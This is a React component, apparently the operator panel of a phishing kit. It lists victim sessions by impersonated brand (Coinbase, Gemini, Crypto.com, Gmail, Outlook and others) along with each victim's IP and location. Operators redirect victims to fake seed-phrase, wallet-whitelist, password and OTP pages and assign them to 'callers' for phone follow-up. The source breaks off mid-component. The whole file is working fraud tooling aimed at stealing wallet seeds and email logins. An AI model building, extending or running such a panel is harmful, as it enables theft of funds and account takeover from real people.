import React, { useState, useEffect, useRef } from 'react';
import { Ban, ExternalLink, Monitor, MapPin, Trash2, Edit2, Check, X, UserPlus, UserX } from 'lucide-react';
import { useAdminSocket } from '../contexts/AdminSocket';
import { useAuth } from '../contexts/AuthContext';
import notificationSound from './notification.mp3';
import PlaceholderDialog from './PlaceholderDialog';
import AssignCallerModal from './AssignCallerModal';

// Extract brand from session ID prefix
const getBrandFromSessionId = (sessionId) => {
  if (!sessionId) return 'Unknown';

  const prefix = sessionId.split('-')[0];
  switch(prefix) {
    case 'CB': return 'Coinbase';
    case 'GEMINI': return 'Gemini';
    case 'LOBSTR': return 'Lobstr';
    case 'GMAIL': return 'Gmail';
    case 'CRYPTO': return 'Crypto.com';
    default: return 'Coinbase'; // Default for old sessions without prefix
  }
};

// Brand color mapping
const getBrandColor = (brand) => {
  switch(brand) {
    case 'Coinbase': return 'bg-blue-500/20 text-blue-400 border-blue-500/30';
    case 'Gemini': return 'bg-cyan-500/20 text-cyan-400 border-cyan-500/30';
    case 'Lobstr': return 'bg-purple-500/20 text-purple-400 border-purple-500/30';
    case 'Gmail': return 'bg-red-500/20 text-red-400 border-red-500/30';
    case 'Crypto.com': return 'bg-indigo-500/20 text-indigo-400 border-indigo-500/30';
    default: return 'bg-gray-500/20 text-gray-400 border-gray-500/30';
  }
};

const DeviceDetectorUtil = {
  browsers: {
    chrome: /chrome|chromium|crios/i,
    firefox: /firefox|fxios/i,
    safari: /safari/i,
    edge: /edg/i,
    opera: /opr|opera/i,
    ie: /trident|msie/i,
    brave: /brave/i,
    vivaldi: /vivaldi/i
  },
  operatingSystems: {
    windows: /windows/i,
    macos: /macintosh|mac os x/i,
    linux: /linux/i,
    ios: /iphone|ipad|ipod/i,
    android: /android/i,
    chromeos: /cros/i
  },
  detectBrowser(userAgent) {
    const ua = userAgent.toLowerCase();
    for (const [browser, regex] of Object.entries(this.browsers)) {
      if (regex.test(ua)) {
        return browser.charAt(0).toUpperCase() + browser.slice(1);
      }
    }
    return 'Unknown';
  },
  detectOS(userAgent) {
    const ua = userAgent.toLowerCase();
    for (const [os, regex] of Object.entries(this.operatingSystems)) {
      if (regex.test(ua)) {
        return os.charAt(0).toUpperCase() + os.slice(1);
      }
    }
    return 'Unknown';
  }
};

const SessionAlias = ({ sessionId, isDesktop = false }) => {
  const { getAlias, setAlias: setServerAlias, aliases } = useAdminSocket();
  const [isEditing, setIsEditing] = useState(false);
  const [alias, setAlias] = useState('');
  const [tempAlias, setTempAlias] = useState('');
  const inputRef = useRef(null);

  useEffect(() => {
    const currentAlias = getAlias(sessionId);
    setAlias(currentAlias);
    setTempAlias(currentAlias);
  }, [sessionId, aliases, getAlias]);

  useEffect(() => {
    if (isEditing && inputRef.current) {
      inputRef.current.focus();
      inputRef.current.select();
    }
  }, [isEditing]);

  const handleSave = () => {
    const newAlias = tempAlias.trim() || sessionId.slice(0, 8);
    setAlias(newAlias);
    setServerAlias(sessionId, newAlias);
    setIsEditing(false);
  };

  const handleCancel = () => {
    setTempAlias(alias);
    setIsEditing(false);
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      handleSave();
    } else if (e.key === 'Escape') {
      handleCancel();
    }
  };

  if (!isEditing) {
    return (
      <div className="flex items-center space-x-2">
        <span className={`${isDesktop ? 'text-sm' : 'text-sm'} font-medium text-white/80`}>
          {alias}
        </span>
        <button
          onClick={() => setIsEditing(true)}
          className="p-1 rounded hover:bg-white/10 transition-colors"
          title="Edit alias"
        >
          <Edit2 className="w-3 h-3 text-gray-400 hover:text-white" />
        </button>
      </div>
    );
  }

  return (
    <div className="flex items-center space-x-1">
      <input
        ref={inputRef}
        type="text"
        value={tempAlias}
        onChange={(e) => setTempAlias(e.target.value)}
        onKeyDown={handleKeyDown}
        className="px-2 py-0.5 text-sm bg-[#1C2029] border border-gray-700 rounded text-white/80 focus:outline-none focus:border-blue-500"
        style={{ width: '120px' }}
      />
      <button
        onClick={handleSave}
        className="p-1 rounded hover:bg-green-500/20 transition-colors"
        title="Save"
      >
        <Check className="w-3 h-3 text-green-400" />
      </button>
      <button
        onClick={handleCancel}
        className="p-1 rounded hover:bg-red-500/20 transition-colors"
        title="Cancel"
      >
        <X className="w-3 h-3 text-red-400" />
      </button>
    </div>
  );
};

const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isNew, selectedBrand, userRole }) => {
  // Detect brand from session ID
  const detectedBrand = getBrandFromSessionId(session.id);
  const actualBrand = selectedBrand || detectedBrand;

  const getDefaultPage = (brand) => {
    switch(brand) {
      case 'Lobstr': return 'lobstrloading.html';
      case 'Gemini': return 'geminiloading.html';
      case 'Crypto.com': return 'cryptocomloading.html';
      case 'Gmail': return 'gmaillogin.html';
      case 'Yahoo': return 'yahoologin.html';
      case 'Outlook': return 'outlooklogin.html';
      case 'iCloud': return 'icloudlogin.html';
      case 'AOL': return 'aollogin.html';
      case 'Proton': return 'protonlogin.html';
      default: return 'Loading.html'; // Coinbase default with capital L
    }
  };

  const defaultPage = getDefaultPage(actualBrand);
  const [selectedPage, setSelectedPage] = useState(session.currentPage || defaultPage || 'Loading.html');

  // Update selectedPage when brand changes
  useEffect(() => {
    const newDefaultPage = getDefaultPage(actualBrand);
    setSelectedPage(newDefaultPage);
  }, [actualBrand]);
  
  const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
  const os = DeviceDetectorUtil.detectOS(session.userAgent);

  const formatPageName = (page) => {
    if (!page) return '';
    
    // Remove any path components and get just the filename
    const filename = page.split('/').pop();
    
    // Remove .html and handle both hyphen and normal case
    return filename
      .replace('.html', '')
      .replace(/([A-Z])/g, ' $1') // Add space before capital letters
      .split(/[-\s]/) // Split by hyphens or spaces
      .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
      .join(' ')
      .trim();
  };

  const actionIconStyle = "w-4 h-4";
  const actionButtonStyle = `
    p-2 rounded-lg transition-colors duration-200
    backdrop-blur-sm active:scale-95
  `;

  return (
    <div className={`
      relative p-4 mb-3
      bg-[#1A1A1A] rounded-lg border border-white/10
      ${isNew ? 'animate-highlight' : ''}
    `}>
      {/* Badge for review status */}
      {(session.reviewCompleted || session.selectedAmount) && (
        <div className="absolute -top-2 right-4 flex items-center space-x-2">
          {session.reviewCompleted && (
            <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                          bg-gradient-to-r from-green-500/5 to-green-500/10
                          ring-1 ring-green-500/20 text-green-400">
              Reviewed
            </div>
          )}
          {session.selectedAmount && (
            <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                          bg-gradient-to-r from-blue-500/5 to-blue-500/10
                          ring-1 ring-blue-500/20 text-blue-400">
              {session.selectedAmount}
            </div>
          )}
        </div>
      )}

      {/* Header Row */}
      <div className="flex items-center justify-between mb-3">
        <div className="flex items-center space-x-2">
          {/* Brand Badge */}
          <div className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium border ${getBrandColor(detectedBrand)}`}>
            {detectedBrand}
          </div>
          {settings.showAliases ? (
            <SessionAlias sessionId={session.id} isDesktop={false} />
          ) : (
            <>
              <Monitor className="w-4 h-4 text-white/40" />
              <span className="text-sm font-medium text-white/80">{session.id}</span>
            </>
          )}
        </div>
        <StatusBadge
          status={session.loading ? 'loading' : (session.connected ? 'connected' : 'inactive')}
        />
      </div>

      {/* Info Rows */}
      <div className="space-y-2 mb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <MapPin className="w-4 h-4 text-white/40" />
            <span className="text-sm text-white/60">
              {session.ip} • {session.city}, {session.country}
            </span>
          </div>
        </div>

        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <span className="text-sm text-white/60">
              {os} • {browser}
            </span>
          </div>
          <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
        </div>

        <div className="bg-white/5 px-2 py-1 rounded-md inline-block">
          <span className="text-sm text-white/80">
            {formatPageName(session.currentPage)}
          </span>
        </div>
      </div>

      {/* Actions Row */}
      <div className="flex items-center justify-between mt-4">
        <CategorizedPageSelect
          selectedPage={selectedPage}
          onPageChange={setSelectedPage}
          isHovered={false}
          selectedBrand={actualBrand}
        />
        
        <div className="flex items-center space-x-2">
          <button
            onClick={() => onRedirect(session.id, selectedPage)}
            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400`}
            title="Redirect User"
          >
            <ExternalLink className={actionIconStyle} />
          </button>

          {userRole === 'admin' && (
            <>
              <button
                onClick={() => onRemove(session.id)}
                className={`${actionButtonStyle} bg-orange-500/20 text-orange-400`}
                title="Remove Session"
              >
                <Trash2 className={actionIconStyle} />
              </button>

              <button
                onClick={() => onBan(session.ip)}
                className={`${actionButtonStyle} bg-red-500/20 text-red-400`}
                title="Ban IP"
              >
                <Ban className={actionIconStyle} />
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

const CategorizedPageSelect = ({ selectedPage = 'loading.html', onPageChange, isHovered, selectedBrand = 'Coinbase' }) => {
  const brandPages = {
    Coinbase: {
      Introduction: [
        { id: 'loading.html', name: 'Loading' },
        { id: 'review.html', name: 'Review' },
        { id: 'estimatedbalance.html', name: 'Estimated Balance' },
        { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
      ],
      'Hardware Wallets': [
        { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
        { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
        { id: 'MoveToCold.html', name: 'Move to Cold' }
      ],
      Awaiting: [
        { id: 'Pendingreview.html', name: 'Pending Review' }
      ],
      'Completed Task': [
        { id: 'Completed.html', name: 'Review Completed' },
        { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
      ],
      Others: [
        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
        { id: 'InvalidSeed.html', name: 'Invalid Seed' }
      ]
    },
    Lobstr: {
      Introduction: [
        { id: 'lobstrloading.html', name: 'Loading' },
        { id: 'lobstrReview.html', name: 'Review' },
        { id: 'lobstrEstimatedBalance.html', name: 'Estimated Balance' },
      ],
      'Wallets': [
        { id: 'lobstrWhitelistWallet.html', name: 'Whitelist Wallet' },
        { id: 'lobstrDisconnectWallet.html', name: 'Disconnect Wallet' },
      ],
      Invalid: [
        { id: 'lobstrInvalidSeed.html', name: 'Invalid Seed' }
      ]
    },
    Gemini: {
      Introduction: [
        { id: 'geminiloading.html', name: 'Loading' },
        { id: 'geminireview.html', name: 'Review' },
        { id: 'geminiestimatedbalance.html', name: 'Estimated Balance' },
      ],
      'Wallets': [
        { id: 'geminiwhitelistwallet.html', name: 'Whitelist Wallet' },
        { id: 'geminidisconnectwallet.html', name: 'Disconnect Wallet' },
      ],
      'Completed Task': [
        { id: 'geminicompleted.html', name: 'Review Completed' },
        { id: 'geminiwhitelistsuccessful.html', name: 'Whitelist Successful' }
      ],
      Invalid: [
        { id: 'geminiinvalidseed.html', name: 'Invalid Seed' }
      ]
    },
    'Crypto.com': {
      Introduction: [
        { id: 'cryptocomloading.html', name: 'Loading' },
        { id: 'cryptocomreview.html', name: 'Review' },
        { id: 'cryptocomestimatedbalance.html', name: 'Estimated Balance' },
      ],
      'Wallets': [
        { id: 'cryptocomwhitelistwallet.html', name: 'Whitelist Wallet' },
        { id: 'cryptocomdisconnectwallet.html', name: 'Disconnect Wallet' },
      ],
      'Completed Task': [
        { id: 'cryptocomcompleted.html', name: 'Review Completed' },
        { id: 'cryptocomwhitelistsuccessful.html', name: 'Whitelist Successful' }
      ],
      Invalid: [
        { id: 'cryptocominvalidseed.html', name: 'Invalid Seed' }
      ]
    },
    Gmail: {
      Login: [
        { id: 'gmaillogin.html', name: 'Login' },
        { id: 'gmailotp.html', name: 'OTP Verification' },
        { id: 'gmailpassword.html', name: 'Password' },
      ],
      Account: [
        { id: 'gmailverify.html', name: 'Verify Account' },
        { id: 'gmailreset.html', name: 'Reset Password' },
        { id: 'gmailstall.html', name: 'Stall Page' },
      ],
      Status: [
        { id: 'gmailwaiting.html', name: 'Waiting' },
        { id: 'gmailinvalid.html', name: 'Invalid Login' },
      ]
    },
    Yahoo: {
      Login: [
        { id: 'yahoologin.html', name: 'Login' },
        { id: 'yahoootp.html', name: 'OTP Verification' },
        { id: 'yahoopassword.html', name: 'Password' },
      ],
      Account: [
        { id: 'yahoocaptcha.html', name: 'Captcha' },
        { id: 'yahoorecovery.html', name: 'Account Recovery' },
      ],
      Status: [
        { id: 'yahoowaiting.html', name: 'Waiting' },
        { id: 'yahooinvalid.html', name: 'Invalid Login' },
      ]
    },
    Outlook: {
      Login: [
        { id: 'outlooklogin.html', name: 'Login' },
        { id: 'outlookotp.html', name: 'OTP Verification' },
      ]
    },
    iCloud: {
      Login: [
        { id: 'icloudlogin.html', name: 'Login' },
        { id: 'icloudotp.html', name: 'OTP Verification' },
      ]
    },
    AOL: {
      Login: [
        { id: 'aollogin.html', name: 'Login' },
        { id: 'aolotp.html', name: 'OTP Verification' },
      ]
    },
    Proton: {
      Login: [
        { id: 'protonlogin.html', name: 'Login' },
        { id: 'protonotp.html', name: 'OTP Verification' },
      ]
    }
  };

  const pageCategories = brandPages[selectedBrand] || brandPages.Coinbase

  return (
    <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
      <select
        value={selectedPage}
        onChange={(e) => onPageChange(e.target.value)}
        style={{ 
          transform: 'translate3d(0, 0, 0)',
          transformOrigin: 'top'
        }}
        className="relative text-xs rounded-lg border w-full
                   transition-all duration-300
                   bg-white/[0.05] border-white/10 hover:bg-white/[0.08] hover:border-white/20
                   text-white/80 py-1 px-2
                   focus:outline-none focus:border-blue-500/30 focus:ring-1 focus:ring-blue-500/20
                   shadow-lg shadow-black/5
                   z-50"
      >
        {Object.entries(pageCategories).map(([category, pages]) => (
          <optgroup key={category} label={category} className="bg-[#1A1A1A] text-white/60">
            {pages.map(page => (
              <option key={page.id} value={page.id} className="bg-[#1A1A1A]">
                {page.name}
              </option>
            ))}
          </optgroup>
        ))}
      </select>
    </div>
  );
};

const HeartbeatIndicator = ({ lastHeartbeat }) => {
  const secondsAgo = Math.round((Date.now() - lastHeartbeat) / 1000);
  
  return (
    <div className="flex items-center space-x-2">
      <div className="relative">
        <div className="absolute -inset-0.5 rounded-full bg-red-500/20 animate-[pulse_2s_ease-in-out_infinite]" />
        <span className="relative text-red-400">❤</span>
      </div>
      <span className="text-white/60 text-sm">
        {secondsAgo}s ago
      </span>
    </div>
  );
};

const StatusBadge = ({ status }) => {
  const getStatusStyles = () => {
    if (status === 'loading') {
      return {
        base: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/30',
        glow: 'from-yellow-500/10 to-transparent'
      };
    }
    if (status === 'connected') {
      return {
        base: 'bg-green-500/20 text-green-300 border-green-500/30',
        glow: 'from-green-500/10 to-transparent'
      };
    }
    return {
      base: 'bg-red-500/20 text-red-300 border-red-500/30',
      glow: 'from-red-500/10 to-transparent'
    };
  };

  // If loading is true, ignore connected state
  const getDisplayStatus = () => {
    if (status === 'loading') return 'Loading';
    if (status === 'connected') return 'Active';
    return 'Inactive';
  };

  const styles = getStatusStyles();

  return (
    <div className={`
      relative inline-flex px-2 py-1 rounded-full text-xs font-medium 
      border backdrop-blur-xl ${styles.base}
      shadow-lg shadow-black/5
      transition-all duration-300 group
    `}>
      <div className="absolute inset-0 rounded-full backdrop-blur-md" />
      <div className={`
        absolute inset-0 opacity-0 group-hover:opacity-100
        transition-opacity duration-500 blur-xl
        bg-gradient-to-r ${styles.glow}
      `} />
      <div className="relative flex items-center space-x-1">
        <div className="relative w-1.5 h-1.5">
          <div className="absolute inset-0 rounded-full bg-current" />
          {status === 'connected' && (
            <div className="absolute inset-0 rounded-full bg-current animate-[pulse_8s_ease-in-out_infinite] opacity-75" />
          )}
        </div>
        <span className="relative z-10">
          {getDisplayStatus()}
        </span>
      </div>
    </div>
  );
};

const SessionHeaderRow = () => {
  return (
    <div className="relative px-6 py-4">
      <div className="absolute inset-0 bg-white/[0.01] backdrop-blur-sm" />
      <div className="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent opacity-0" />
      <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent opacity-0" />
      
      <div className="relative grid grid-cols-12 gap-4 items-center">
        <div className="col-span-3">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Session Info
          </div>
        </div>
        <div className="col-span-1">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Device
          </div>
        </div>
        <div className="col-span-2">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Location
          </div>
        </div>
        <div className="col-span-2">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Current Page
          </div>
        </div>
        <div className="col-span-1">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Last Active
          </div>
        </div>
        <div className="col-span-1">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
            Status
          </div>
        </div>
        <div className="col-span-2">
          <div className="text-xs font-medium text-white/60 uppercase tracking-wider text-right">
            Actions
          </div>
        </div>
      </div>
    </div>
  );
};

const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand, userRole, onAssignClick }) => {
  const { settings, callers, unassignSession } = useAdminSocket();

  const getDefaultPage = (brand) => {
    switch(brand) {
      case 'Lobstr': return 'lobstrloading.html';
      case 'Gemini': return 'geminiloading.html';
      case 'Crypto.com': return 'cryptocomloading.html';
      case 'Gmail': return 'gmaillogin.html';
      case 'Yahoo': return 'yahoologin.html';
      case 'Outlook': return 'outlooklogin.html';
      case 'iCloud': return 'icloudlogin.html';
      case 'AOL': return 'aollogin.html';
      case 'Proton': return 'protonlogin.html';
      default: return 'loading.html'; // Coinbase default
    }
  };

  const defaultPage = getDefaultPage(selectedBrand);
  const [selectedPage, setSelectedPage] = useState(session.currentPage || defaultPage || 'loading.html');

  // Update selectedPage when brand changes
  useEffect(() => {
    const newDefaultPage = getDefaultPage(selectedBrand);
    setSelectedPage(newDefaultPage);
  }, [selectedBrand]);

  const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
  const os = DeviceDetectorUtil.detectOS(session.userAgent);

  const formatPageName = (page) => {
    if (!page) return '';
    
    // First remove any path and get just the filename
    const filename = page.split('/').pop();
    
    // Special case handling for known pages
    const knownPages = {
      'whitelistwallet': 'Whitelist Wallet',
      'estimatedbalance': 'Estimated Balance',
      'pendingreview': 'Pending Review',
      'whitelistsuccessful': 'Whitelist Successful',
      'disconnectwallet': 'Disconnect Wallet',
      'unlinkwallet': 'Unlink Wallet',
      'movetocold': 'Move To Cold',
      'invalidseed': 'Invalid Seed',
      'ledgerdisconnect': 'Ledger Disconnect',
      'trezordisconnect': 'Trezor Disconnect',
      'loading': 'Loading',
      'review': 'Review'
    };
  
    // Remove .html and convert to lowercase for matching
    const baseName = filename.replace('.html', '').toLowerCase();
    
    return knownPages[baseName] || baseName;
  };

  return (
    <div
      className={`
        group relative px-6 py-4
        transition-all duration-500
        ${isNew ? 'animate-highlight' : ''}
        hover:translate-y-[-1px]
        hover:shadow-[0_8px_16px_-6px_rgba(0,0,0,0.2)]
      `}
    >
      <div className="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent
                     transition-opacity duration-500 opacity-0 group-hover:opacity-100 pointer-events-none" />

      <div className="relative grid grid-cols-12 gap-4 items-center">
        <div className="col-span-3">
          <div className="flex items-center space-x-6">
            <div className="flex flex-col">
              <div className="flex items-center space-x-2">
                {settings.showAliases ? (
                  <SessionAlias sessionId={session.id} isDesktop={true} />
                ) : (
                  <>
                    <Monitor className="w-4 h-4 text-white/40 transition-transform duration-300
                                      group-hover:scale-110" />
                    <span className="text-sm font-medium text-white/80">{session.id}</span>
                  </>
                )}
              </div>
              {(session.reviewCompleted || session.selectedAmount) && (
                <div className="flex items-center space-x-2 mt-0.5 ml-6">
                  {session.reviewCompleted && (
                    <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                                  bg-gradient-to-r from-green-500/5 to-green-500/10
                                  ring-1 ring-green-500/20 text-green-400">
                      Reviewed
                    </div>
                  )}
                  {session.selectedAmount && (
                    <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
                                  bg-gradient-to-r from-blue-500/5 to-blue-500/10
                                  ring-1 ring-blue-500/20 text-blue-400">
                      {session.selectedAmount}
                    </div>
                  )}
                </div>
              )}
            </div>
            <div className="flex items-center space-x-2">
              <MapPin className="w-4 h-4 text-white/40 transition-transform duration-300
                               group-hover:scale-110" />
              <span className="text-sm text-white/60">{session.ip}</span>
            </div>
          </div>
        </div>

        <div className="col-span-1">
          <div className="flex flex-col">
            <span className="text-xs text-white/80">{browser}</span>
            <span className="text-xs text-white/60">{os}</span>
          </div>
        </div>

        <div className="col-span-2">
          <span className="text-sm text-white/60">
            {session.city}, {session.country}
          </span>
        </div>

        <div className="col-span-2">
          <div className={`relative inline-flex items-center px-2 py-1 rounded-md
                        overflow-hidden transition-all duration-300`}>
            <span className="text-sm font-medium text-white/90">
              {formatPageName(session.currentPage)}
            </span>
          </div>
        </div>

        <div className="col-span-1">
          <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
        </div>

        <div className="col-span-1">
          <StatusBadge
            status={session.loading ? 'loading' : (session.connected || session.loading ? 'connected' : 'inactive')}
          />
        </div>

        <div className="col-span-2 flex items-center justify-end space-x-1">

          <CategorizedPageSelect
            selectedPage={selectedPage}
            onPageChange={setSelectedPage}
            isHovered={false}
            selectedBrand={selectedBrand}
          />

          <button
            onClick={() => onRedirect(session.id, selectedPage)}
            className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                     hover:bg-white/[0.08] text-blue-400 hover:text-blue-300
                     shadow-lg shadow-black/5 active:scale-95`}
          >
            <ExternalLink className="w-4 h-4 transition-transform duration-300
                                    group-hover:scale-110" />
          </button>

          {userRole === 'admin' && (
            <>
              <button
                onClick={() => onRemove(session.id)}
                className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                         hover:bg-white/[0.08] text-orange-400 hover:text-orange-300
                         shadow-lg shadow-black/5 active:scale-95`}
              >
                <Trash2 className="w-4 h-4 transition-transform duration-300
                                  group-hover:scale-110" />
              </button>

              <button
                onClick={() => onBan(session.ip)}
                className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                         hover:bg-white/[0.08] text-red-400 hover:text-red-300
                         shadow-lg shadow-black/5 active:scale-95`}
              >
                <Ban className="w-4 h-4 transition-transform duration-300
                              group-hover:scale-110" />
              </button>

              {/* Assignment controls */}
              {session.assignedTo ? (
                <div className="flex items-center space-x-1">
                  <span className="text-xs text-purple-400 bg-purple-500/20 px-2 py-1 rounded">
                    {session.assignedTo}
                  </span>
                  <button
                    onClick={() => unassignSession(session.id)}
                    className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                             hover:bg-white/[0.08] text-purple-400 hover:text-purple-300
                             shadow-lg shadow-black/5 active:scale-95`}
                    title="Unassign"
                  >
                    <UserX className="w-3.5 h-3.5 transition-transform duration-300
                                      group-hover:scale-110" />
                  </button>
                </div>
              ) : (
                <button
                  onClick={() => onAssignClick(session)}
                  className={`relative p-1.5 rounded-lg transition-all duration-300 group/btn
                           hover:bg-white/[0.08] text-purple-400 hover:text-purple-300
                           shadow-lg shadow-black/5 active:scale-95`}
                  title="Assign Caller"
                >
                  <UserPlus className="w-3.5 h-3.5 transition-transform duration-300
                                       group-hover:scale-110" />
                </button>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
};

const SessionList = ({ userRole }) => {
  // Add settings to the destructured values from useAdminSocket
  const { sessions, banIP, redirectUser, removeSession, settings, callers, assignSession, aliases, setAlias } = useAdminSocket();
  const { userRole: authUserRole, currentUser: currentUsername } = useAuth();
  const [newSessions, setNewSessions] = useState(new Set());
  const [heartbeatTick, setHeartbeatTick] = useState(0);
  const [selectedBrand, setSelectedBrand] = useState(() => {
    // Persist brand selection in localStorage
    return localStorage.getItem('selectedBrand') || 'All';
  });
  const [placeholderDialog, setPlaceholderDialog] = useState({
    isOpen: false,
    sessionId: null,
    page: null
  });
  const [assignModal, setAssignModal] = useState({
    isOpen: false,
    session: null
  });
  const processedSessionsRef = useRef(new Set());
  const audioRef = useRef(new Audio(notificationSound));

  useEffect(() => {
    audioRef.current.preload = 'auto';
  }, []);

  useEffect(() => {
    // Save brand selection to localStorage when it changes
    localStorage.setItem('selectedBrand', selectedBrand);
  }, [selectedBrand]);

  useEffect(() => {
    const newSessionIds = sessions.filter(session => !processedSessionsRef.current.has(session.id))
                                .map(session => session.id);

    if (newSessionIds.length > 0) {
      audioRef.current.play().catch(err => console.error('Audio play error:', err));
      setNewSessions(new Set([...newSessionIds]));
      processedSessionsRef.current = new Set(sessions.map(s => s.id));

      const timer = setTimeout(() => setNewSessions(new Set()), 3000);
      return () => clearTimeout(timer);
    }
  }, [sessions]);

  useEffect(() => {
    const timer = setInterval(() => setHeartbeatTick(tick => tick + 1), 1000);
    return () => clearInterval(timer);
  }, []);

  const handleBanIP = (ip) => {
    if (window.confirm(`Are you sure you want to ban IP ${ip}?`)) {
      banIP(ip);
    }
  };

  const handleRemoveSession = (sessionId) => {
    if (window.confirm('Are you sure you want to remove this session?')) {
      removeSession(sessionId);
      redirectUser(sessionId, 'loading.html');
    }
  };

  const handleRedirect = (sessionId, page) => {
    // Check if page is valid
    if (!page) {
      console.error('No page specified for redirect');
      return;
    }

    const pageType = page.toLowerCase();

    // Check if this is an email provider page that might need placeholders
    if ((pageType.includes('gmail') || pageType.includes('yahoo') ||
         pageType.includes('outlook') || pageType.includes('proton') ||
         pageType.includes('aol') || pageType.includes('icloud')) &&
        (pageType.includes('login') || pageType.includes('password') || pageType.includes('otp'))) {

      // Show placeholder dialog
      setPlaceholderDialog({
        isOpen: true,
        sessionId,
        page
      });
    } else {
      // Direct redirect without placeholders
      redirectUser(sessionId, page);
    }
  };

  const handlePlaceholderConfirm = (sessionId, page, placeholders) => {
    redirectUser(sessionId, page, placeholders);
    setPlaceholderDialog({
      isOpen: false,
      sessionId: null,
      page: null
    });
  };

  const handleAssignClick = (session) => {
    // Add the alias to the session object if it exists
    const sessionWithAlias = {
      ...session,
      alias: aliases[session.id] || null
    };
    setAssignModal({
      isOpen: true,
      session: sessionWithAlias
    });
  };

  const handleAssignCaller = (sessionId, callerUsername, alias) => {
    // Set the alias first, then assign the session
    setAlias(sessionId, alias);
    assignSession(sessionId, callerUsername);
    setAssignModal({
      isOpen: false,
      session: null
    });
  };

  // Filter sessions based on user role and selected brand
  const filteredSessions = sessions.filter(session => {
    // First filter by assignment for callers
    if (userRole === 'caller') {
      // Callers only see sessions assigned to them
      if (session.assignedTo !== currentUsername) {
        return false;
      }
    }

    // Then filter by brand
    if (selectedBrand === 'All') return true;
    const sessionBrand = getBrandFromSessionId(session.id);
    return sessionBrand === selectedBrand;
  });

  return (
    <div className="mt-6">
      <div className="relative rounded-xl overflow-hidden theme-primary-bg border theme-border">

        <div className="relative">
          <div className="px-6 py-4 border-b border-gray-800/50">
            <div className="relative flex items-center justify-between">
              <div>
                <h2 className="text-lg font-medium text-gray-300">
                  Active Sessions
                </h2>
              </div>
              <div className="relative flex items-center space-x-2">
                <label className="text-sm text-gray-400 mr-2">Brand:</label>
                <select
                  value={selectedBrand}
                  onChange={(e) => setSelectedBrand(e.target.value)}
                  className="px-3 py-1 text-sm rounded-lg border
                           bg-[#1C2029] border-gray-800/50 text-gray-300
                           focus:outline-none
                           focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20
                           transition-all duration-300 hover:bg-[#1E222B]"
                >
                  <option value="All" className="bg-[#1C2029]">All Brands</option>
                  <option value="Coinbase" className="bg-[#1C2029]">Coinbase</option>
                  <option value="Lobstr" className="bg-[#1C2029]">Lobstr</option>
                  <option value="Gemini" className="bg-[#1C2029]">Gemini</option>
                  <option value="Crypto.com" className="bg-[#1C2029]">Crypto.com</option>
                  <option value="Gmail" className="bg-[#1C2029]">Gmail</option>
                  <option value="Yahoo" className="bg-[#1C2029]">Yahoo</option>
                  <option value="Outlook" className="bg-[#1C2029]">Outlook</option>
                  <option value="iCloud" className="bg-[#1C2029]">iCloud</option>
                  <option value="AOL" className="bg-[#1C2029]">AOL</option>
                  <option value="Proton" className="bg-[#1C2029]">Proton</option>
                </select>
              </div>
            </div>
          </div>

          {/* Desktop View */}
          <div className="hidden lg:block">
            <SessionHeaderRow />
            <div className="divide-y divide-white/[0.06]">
              {filteredSessions.map((session) => (
                <SessionRow
                  key={session.id}
                  session={session}
                  onRedirect={handleRedirect}
                  onBan={handleBanIP}
                  onRemove={handleRemoveSession}
                  isNew={newSessions.has(session.id)}
                  selectedBrand={selectedBrand}
                  userRole={userRole}
                  onAssignClick={handleAssignClick}
                />
              ))}
            </div>
          </div>

          <div className="block lg:hidden p-4">
        {filteredSessions.map((session) => (
          <MobileSessionCard
            key={session.id}
            session={session}
            settings={settings}  // Now settings is defined and can be passed
            onRedirect={redirectUser}
            onBan={handleBanIP}
            onRemove={handleRemoveSession}
            isNew={newSessions.has(session.id)}
            selectedBrand={selectedBrand}
            userRole={userRole}
          />
        ))}
      </div>

          {/* Empty State */}
          {filteredSessions.length === 0 && (
            <div className="px-6 py-8 text-center">
              <p className="text-gray-500">
                {sessions.length === 0
                  ? "No active sessions"
                  : `No ${selectedBrand === 'All' ? '' : selectedBrand} sessions found`}
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Placeholder Dialog */}
      <PlaceholderDialog
        isOpen={placeholderDialog.isOpen}
        onClose={() => setPlaceholderDialog({ isOpen: false, sessionId: null, page: null })}
        onConfirm={handlePlaceholderConfirm}
        page={placeholderDialog.page}
